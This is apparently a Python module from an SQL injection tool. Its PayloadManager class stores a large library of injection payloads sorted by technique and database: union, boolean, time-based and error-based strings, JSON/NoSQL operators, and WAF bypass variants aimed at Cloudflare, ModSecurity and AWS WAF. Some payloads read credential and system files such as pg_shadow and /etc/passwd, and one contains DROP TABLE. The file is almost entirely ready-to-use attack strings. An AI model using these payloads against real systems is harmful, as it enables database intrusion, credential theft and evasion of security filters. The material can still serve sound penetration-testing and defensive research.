class PayloadManager:
    def __init__(self):
        self.payloads = {
            # Basic payloads - Enhanced with context-aware variations
            "basic": [
                "'", "\"", ";--", 
                " OR 1=1 --", 
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1\" --",
                "') OR ('1'='1",
                "\") OR (\"1\"=\"1",
                "' OR '1'='1' /*",
                "\" OR \"1\"=\"1\" /*",
                # 2024 Enhanced Basic Payloads
                "' OR 'x'='x' --",
                "' OR 1=1#",
                "' OR 1=1 LIMIT 1 --",
                "' OR 1=1 OFFSET 0 --",
                "' OR true --",
                "' OR 1 --",
                "' OR 'a'='a",
                "' OR 1=1 AND '1'='1",
                "' OR 1=1 AND 'x'='x",
                "' OR 1=1 AND true"
            ],
            
            # Union-based payloads - Database-specific with 2024 techniques
            "union": {
                "generic": [
                    " UNION SELECT NULL", 
                    " UNION SELECT 1,2,3",
                    " UNION ALL SELECT 1,2,3",
                    " UNION SELECT NULL,NULL,NULL",
                    " ORDER BY 1,2,3",
                    # 2024 Enhanced Generic
                    " UNION SELECT 1,2,3,4,5",
                    " UNION SELECT 'a','b','c'",
                    " UNION SELECT CHAR(65),CHAR(66),CHAR(67)",
                    " UNION SELECT 0x61,0x62,0x63",
                    " UNION SELECT 1 WHERE 1=1",
                    " UNION SELECT NULL WHERE 1=1"
                ],
                "mysql": [
                    " UNION SELECT @@version,user(),database()",
                    " UNION SELECT table_name,column_name FROM information_schema.columns",
                    " UNION SELECT CONCAT(table_schema,0x3a,table_name) FROM information_schema.tables",
                    " UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'",
                    " UNION SELECT 1,2,LOAD_FILE('/etc/passwd')",
                    # 2024 MySQL Advanced
                    " UNION SELECT @@version,@@datadir,@@basedir",
                    " UNION SELECT user(),current_user(),system_user()",
                    " UNION SELECT database(),schema(),connection_id()",
                    " UNION SELECT table_name,table_rows,data_length FROM information_schema.tables",
                    " UNION SELECT column_name,data_type,is_nullable FROM information_schema.columns",
                    " UNION SELECT CONCAT(0x3c62723e,table_name) FROM information_schema.tables",
                    " UNION SELECT HEX(table_name) FROM information_schema.tables",
                    " UNION SELECT UNHEX(HEX(table_name)) FROM information_schema.tables",
                    " UNION SELECT COMPRESS(table_name) FROM information_schema.tables",
                    " UNION SELECT UNCOMPRESS(COMPRESS(table_name)) FROM information_schema.tables"
                ],
                "mssql": [
                    " UNION SELECT name FROM master..sysdatabases",
                    " UNION SELECT name FROM sysobjects WHERE xtype='U'",
                    " UNION SELECT name,id FROM sysusers",
                    " UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')",
                    " UNION SELECT @@version,null,null",
                    # 2024 MSSQL Advanced
                    " UNION SELECT @@servername,@@servicename,@@version",
                    " UNION SELECT db_name(),user_name(),suser_name()",
                    " UNION SELECT name,database_id,create_date FROM sys.databases",
                    " UNION SELECT name,object_id,type_desc FROM sys.objects",
                    " UNION SELECT name,column_id,system_type_id FROM sys.columns",
                    " UNION SELECT CONVERT(varchar,name) FROM sys.databases",
                    " UNION SELECT CAST(name AS varchar) FROM sys.databases",
                    " UNION SELECT name+CHAR(32) FROM sys.databases",
                    " UNION SELECT REVERSE(name) FROM sys.databases",
                    " UNION SELECT UPPER(name) FROM sys.databases"
                ],
                "postgres": [
                    " UNION SELECT version(),current_user",
                    " UNION SELECT table_name,column_name FROM information_schema.columns",
                    " UNION SELECT table_catalog,table_name FROM information_schema.tables",
                    " UNION SELECT usename,passwd FROM pg_shadow",
                    " UNION SELECT current_database(),current_user",
                    # 2024 PostgreSQL Advanced
                    " UNION SELECT version(),current_setting('server_version')",
                    " UNION SELECT current_user,session_user,user",
                    " UNION SELECT current_database(),current_schema()",
                    " UNION SELECT tablename,schemaname FROM pg_tables",
                    " UNION SELECT attname,typname FROM pg_attribute,pg_type",
                    " UNION SELECT datname,encoding FROM pg_database",
                    " UNION SELECT usename,usesuper FROM pg_user",
                    " UNION SELECT rolname,rolsuper FROM pg_roles",
                    " UNION SELECT nspname,nspowner FROM pg_namespace",
                    " UNION SELECT proname,prosrc FROM pg_proc"
                ],
                "oracle": [
                    " UNION SELECT banner FROM v$version",
                    " UNION SELECT table_name FROM all_tables",
                    " UNION SELECT owner,table_name FROM all_tables",
                    " UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'",
                    " UNION SELECT username FROM all_users ORDER BY username",
                    # 2024 Oracle Advanced
                    " UNION SELECT banner,version FROM v$version",
                    " UNION SELECT instance_name,host_name FROM v$instance",
                    " UNION SELECT username,account_status FROM dba_users",
                    " UNION SELECT table_name,tablespace_name FROM all_tables",
                    " UNION SELECT column_name,data_type FROM all_tab_columns",
                    " UNION SELECT object_name,object_type FROM all_objects",
                    " UNION SELECT privilege,grantee FROM dba_sys_privs",
                    " UNION SELECT role,password_required FROM dba_roles",
                    " UNION SELECT name,value FROM v$parameter",
                    " UNION SELECT file_name,tablespace_name FROM dba_data_files"
                ],
                "sqlite": [
                    " UNION SELECT sqlite_version()",
                    " UNION SELECT name FROM sqlite_master WHERE type='table'",
                    " UNION SELECT sql FROM sqlite_master",
                    " UNION SELECT group_concat(name) FROM pragma_table_info('users')",
                    # 2024 SQLite Advanced
                    " UNION SELECT sqlite_version(),sqlite_source_id()",
                    " UNION SELECT name,type FROM sqlite_master",
                    " UNION SELECT tbl_name,sql FROM sqlite_master",
                    " UNION SELECT name,file FROM pragma_database_list",
                    " UNION SELECT name,type FROM pragma_table_info('sqlite_master')",
                    " UNION SELECT compile_options FROM pragma_compile_options",
                    " UNION SELECT integrity_check FROM pragma_integrity_check",
                    " UNION SELECT foreign_key_check FROM pragma_foreign_key_check"
                ]
            },
            
            # Boolean-based payloads - Enhanced with modern techniques
            "boolean": [
                " AND 1=1",
                " AND 1=0",
                "' AND '1'='1",
                "' AND '1'='0",
                " AND 1=1--",
                " AND 1=0--",
                "' AND (SELECT 1)='1",
                "' AND (SELECT 0)='1",
                " AND EXISTS(SELECT 1)",
                " AND EXISTS(SELECT 1 FROM non_existent_table)",
                "' AND SUBSTRING('abc',1,1)='a",
                "' AND SUBSTRING('abc',1,1)='x",
                # 2024 Enhanced Boolean
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>1000",
                "' AND LENGTH(database())>0",
                "' AND LENGTH(database())>100",
                "' AND ASCII(SUBSTRING(database(),1,1))>64",
                "' AND ASCII(SUBSTRING(database(),1,1))<91",
                "' AND (SELECT 1 WHERE 1=1)",
                "' AND (SELECT 1 WHERE 1=0)",
                "' AND 1=(SELECT 1)",
                "' AND 0=(SELECT 1)",
                "' AND true",
                "' AND false",
                "' AND 1 LIKE 1",
                "' AND 1 NOT LIKE 0"
            ],
            
            # Time-based payloads - 2024 Advanced with evasion
            "time_based": {
                "mysql": [
                    " AND SLEEP(5)",
                    " AND BENCHMARK(10000000,MD5('A'))",
                    "' AND SLEEP(5)--",
                    "') OR SLEEP(5)--",
                    " UNION SELECT SLEEP(5)",
                    # 2024 MySQL Time-based Advanced
                    " AND (SELECT SLEEP(5))",
                    " AND (SELECT BENCHMARK(5000000,SHA1('test')))",
                    " AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))",
                    " AND IF(1=1,SLEEP(5),0)",
                    " AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END",
                    " AND (SELECT SLEEP(5) WHERE 1=1)",
                    " AND (SELECT SLEEP(5) FROM dual WHERE 1=1)",
                    " AND SLEEP(5)=0",
                    " AND 0=SLEEP(5)",
                    " AND SLEEP(5) IS NULL"
                ],
                "postgres": [
                    " AND PG_SLEEP(5)",
                    "' AND (SELECT pg_sleep(5))--",
                    " SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END",
                    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
                    # 2024 PostgreSQL Time-based Advanced
                    " AND (SELECT pg_sleep(5))",
                    " AND (SELECT COUNT(*) FROM pg_tables WHERE pg_sleep(5) IS NULL)",
                    " AND CASE WHEN 1=1 THEN (SELECT pg_sleep(5)) ELSE 0 END",
                    " AND (SELECT pg_sleep(5) WHERE 1=1)",
                    " AND pg_sleep(5)=''",
                    " AND ''=pg_sleep(5)",
                    " AND pg_sleep(5) IS NULL"
                ],
                "mssql": [
                    " WAITFOR DELAY '0:0:5'",
                    "'; WAITFOR DELAY '0:0:5'--",
                    " IF 1=1 WAITFOR DELAY '0:0:5'",
                    " SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' ELSE 'a' END",
                    # 2024 MSSQL Time-based Advanced
                    " AND (SELECT COUNT(*) FROM sys.tables WHERE WAITFOR DELAY '0:0:5' IS NULL)",
                    " AND CASE WHEN 1=1 THEN (WAITFOR DELAY '0:0:5') ELSE 0 END",
                    " AND (WAITFOR DELAY '0:0:5')=''",
                    " AND ''=(WAITFOR DELAY '0:0:5')",
                    "; IF 1=1 BEGIN WAITFOR DELAY '0:0:5' END",
                    "; WHILE 1=1 BEGIN WAITFOR DELAY '0:0:5' BREAK END"
                ],
                "oracle": [
                    " AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1",
                    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
                    " BEGIN DBMS_LOCK.SLEEP(5); END;",
                    " SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual",
                    # 2024 Oracle Time-based Advanced
                    " AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('test',5) FROM dual)=1",
                    " AND DBMS_LOCK.SLEEP(5)=0",
                    " AND (SELECT COUNT(*) FROM all_tables WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)",
                    " AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE 0 END=0",
                    " AND UTL_INADDR.GET_HOST_NAME('127.0.0.1'||CHR(124)||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual)) IS NOT NULL"
                ],
                "sqlite": [
                    " AND randomblob(500000000)",
                    "' AND randomblob(500000000)--",
                    " AND (SELECT count(*) FROM sqlite_master)>0 AND randomblob(500000000)",
                    # 2024 SQLite Time-based Advanced
                    " AND (SELECT randomblob(100000000))",
                    " AND randomblob(50000000) IS NOT NULL",
                    " AND LENGTH(randomblob(10000000))>0",
                    " AND (SELECT COUNT(*) FROM sqlite_master WHERE randomblob(10000000) IS NOT NULL)"
                ]
            },
            
            # Error-based payloads - 2024 Enhanced
            "error_based": [
                " AND (SELECT 1/0)",
                " AND (SELECT 1 FROM information_schema.tables)",
                " AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))",
                " AND 1=(SELECT 1 FROM DUAL WHERE 1=1/0)",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
                "' AND (SELECT 2 FROM (SELECT name_const(CHAR(111,108,101,108,111),1),name_const(CHAR(111,108,101,108,111),1))a)--",
                "' AND CAST((SELECT username FROM users LIMIT 1) AS int)--",
                "' AND CAST('abc' AS NUMERIC)--",
                # 2024 Enhanced Error-based
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--",
                "' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--",
                "' AND MULTIPOINT((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--",
                "' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--",
                "' AND EXP(~(SELECT * FROM (SELECT user())a))--",
                "' AND GTID_SUBSET(@@version,1)--"
            ],
            
            # Advanced payloads - 2024 Cutting-edge techniques
            "advanced": [
                " AND (SELECT count(*) FROM information_schema.tables)",
                " AND (SELECT table_name FROM information_schema.tables LIMIT 1)",
                " AND (SELECT CURRENT_USER)",
                " AND (SELECT DATABASE())",
                " AND (SELECT @@datadir)",
                " AND (SELECT USER())",
                " AND (SELECT SYSTEM_USER())",
                " AND (SELECT SESSION_USER())",
                " AND (SELECT @@hostname)",
                " AND (SELECT @@version_compile_os)",
                " AND (SELECT @@version_compile_machine)",
                " AND (SELECT @@basedir)",
                # 2024 Advanced Techniques
                " AND (SELECT JSON_EXTRACT(@@version,'$'))",
                " AND (SELECT JSON_UNQUOTE(JSON_EXTRACT(@@version,'$')))",
                " AND (SELECT REGEXP_REPLACE(@@version,'[0-9]','X'))",
                " AND (SELECT SUBSTRING_INDEX(@@version,'-',1))",
                " AND (SELECT REVERSE(REVERSE(@@version)))",
                " AND (SELECT COMPRESS(@@version))",
                " AND (SELECT UNCOMPRESS(COMPRESS(@@version)))",
                " AND (SELECT AES_ENCRYPT(@@version,'key'))",
                " AND (SELECT AES_DECRYPT(AES_ENCRYPT(@@version,'key'),'key'))",
                " AND (SELECT TO_BASE64(@@version))",
                " AND (SELECT FROM_BASE64(TO_BASE64(@@version)))",
                " AND (SELECT HEX(@@version))",
                " AND (SELECT UNHEX(HEX(@@version)))",
                " AND (SELECT SOUNDEX(@@version))",
                " AND (SELECT CRC32(@@version))"
            ],
            
            # WAF Bypass techniques - 2024 State-of-the-art evasion
            "bypass": [
                "'/*!50000OR*/'1'='1",
                "' OR 1=1 -- ",
                "' OR '1'='1' /*",
                "/*!50000UNION*/ SELECT",
                "UNION/*!50000ALL*/SELECT",
                "'||'1'='1",
                "' OR 1=1 IN/**/CHAR(45,45)",
                "%55%4e%49%4f%4e %53%45%4c%45%43%54",  # URL-encoded UNION SELECT
                "'+OR+1=1--",
                "' OR 1='1",
                "' OR '1'='1",
                "' OR 1 -- -",
                "' OR 1/**/=/**/1",
                "' OR 1=1 LIMIT 1 -- -+",
                "' /*!50000OR*/ '1'='1'",
                "' /*!OR*/ '1'='1'",
                "' OR 1=1 -- -",
                "' OR 'x'='x",
                "' OR (SELECT 1) -- -",
                "' OR EXISTS(SELECT 1) -- -",
                # 2024 Advanced WAF Bypass
                "' /*!12345OR*/ '1'='1'",
                "' /*!50001OR*/ '1'='1'",
                "' /**/OR/**/ '1'='1'",
                "' /*T*/OR/*T*/ '1'='1'",
                "' /*U*/NION/*U*/ SELECT",
                "' UN/**/ION SE/**/LECT",
                "' UNI/**/ON SEL/**/ECT",
                "' UNIO/**/N SELE/**/CT",
                "' %55NION %53ELECT",
                "' %55%4eION %53%45LECT",
                "' /*!UNION*/ /*!SELECT*/",
                "' /*!50000%55nion*/ /*!50000%53elect*/",
                "' +UNION+DISTINCT+SELECT+",
                "' UNION+ALL+SELECT+",
                "' UNION%20SELECT%20",
                "' UNION%0ASELECT%0A",
                "' UNION%0DSELECT%0D",
                "' UNION%0D%0ASELECT%0D%0A",
                "' UNION%09SELECT%09",
                "' UNION%0BSELECT%0B",
                "' UNION%0CSELECT%0C",
                "' UNION%A0SELECT%A0",
                "' %252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/",
                "' /*!50000UniON SeLeCt*/",
                "' /*!50000UnIoN sElEcT*/",
                "' /*!50000uNiOn SeLeCt*/",
                "' AND 1=1 AND 'a'='a",
                "' AND 1=1 AND 'b'='b",
                "' AND 1=1 AND 'c'='c",
                "' AND 1=1 AND 'd'='d",
                "' AND 1=1 AND 'e'='e",
                # 2025 Cutting-Edge WAF Bypass Techniques
                "' OR '1'='1' AND SLEEP(0)--",
                "' UNION SELECT NULL,NULL,NULL WHERE 1=SLEEP(0)--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                "' OR IF(1=1,BENCHMARK(100000,MD5(1)),0)--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
                "' AND (SELECT * FROM (SELECT(SLEEP(0)))x)--",
                "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                "' UNION ALL SELECT NULL,NULL,NULL#",
                "' OR 1=1 LIMIT 1,1--",
                # Cloudflare-specific bypasses (2025)
                "' AND'x'='x",
                "' AND''='",
                "' OR''='",
                "' OR 'x'LIKE'x",
                "' OR 1--",
                "' OR 1#",
                "' OR 1/*",
                # ModSecurity bypasses (2025)
                "' /*!12345UNION*/ /*!12345SELECT*/",
                "' %55%4E%49%4F%4E %53%45%4C%45%43%54",
                "' un?+??+?ion sel??+?ct",
                "' %75nion %73elect",
                # AWS WAF bypasses (2025)
                "' UNION/**_**/SELECT/**_**/NULL--",
                "' AND SLEEP(0)AND'1",
                "' OR 1 RLIKE 1--",
                "' OR 'a' REGEXP 'a'--"
            ],
            
            # JSON-specific payloads - 2024 Enhanced
            "json": [
                "\" OR 1=1 --",
                "\" || 1=1 --",
                "\" OR \"1\"=\"1\" --",
                "\\\" OR 1=1 --",
                "}'; SELECT 1; --",
                "{\"key\": \"value' OR '1'='1\"}",
                "{\"key\": \"value\\\") OR (\\\"1\\\"=\\\"1\\\"}",
                "{\"key\": null, \"admin\": true}",
                "{\"key\":\"value\", \"$gt\": \"\"}",
                "{\"$where\": \"return true\"}",
                "{\"username\": {\"$ne\": null}}",
                "{\"password\": {\"$regex\": \".*\"}}",
                "{\"$where\": \"this.password.match(/.*/)\"}"
                # 2024 Enhanced JSON
                "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"root\"}]}",
                "{\"$and\": [{\"active\": true}, {\"role\": \"admin\"}]}",
                "{\"$nor\": [{\"deleted\": true}]}",
                "{\"username\": {\"$in\": [\"admin\", \"root\", \"user\"]}}",
                "{\"password\": {\"$nin\": [\"\", null]}}",
                "{\"age\": {\"$gte\": 0}}",
                "{\"created\": {\"$lte\": new Date()}}",
                "{\"$expr\": {\"$gt\": [\"$balance\", 1000]}}",
                "{\"$jsonSchema\": {\"properties\": {\"admin\": {\"const\": true}}}}",
                "{\"$text\": {\"$search\": \"admin\"}}",
                "{\"$comment\": \"'; DROP TABLE users; --\"}",
                "{\"username\": {\"$regex\": \"^admin\", \"$options\": \"i\"}}",
                "{\"$where\": \"function() { return this.username == 'admin' || true; }\"}",
                "{\"$where\": \"function() { return /admin/.test(this.username); }\"}",
                "{\"$where\": \"function() { return JSON.stringify(this).indexOf('admin') > -1; }\"}"
            ],

            # NoSQL Injection Payloads (Placeholder for future feature)
            "nosql": [
                "{\"$where\": \"true\"}",
                "{\"$where\": \"sleep(5000)\"}",
                "{\"$gt\": \"\"}",
                "[$ne]",
                "|| 1==1"
            ]
        }

    def get_payloads_by_type(self, injection_type):
        """Get payloads by injection type with enhanced filtering"""
        payloads = self.payloads.get(injection_type, [])
        
        # If payloads are database-specific, return all variants
        if isinstance(payloads, dict):
            all_payloads = []
            for db_type in payloads:
                all_payloads.extend(payloads[db_type])
            return all_payloads
        
        return payloads
        
    def get_db_specific_payloads(self, injection_type, db_type):
        """Get database-specific payloads for a given injection type and database"""
        if injection_type not in self.payloads:
            return []
            
        payloads = self.payloads[injection_type]
        if not isinstance(payloads, dict):
            return payloads
            
        if db_type.lower() in payloads:
            return payloads[db_type.lower()]
        
        # Return generic payloads if available, otherwise empty list
        return payloads.get("generic", [])
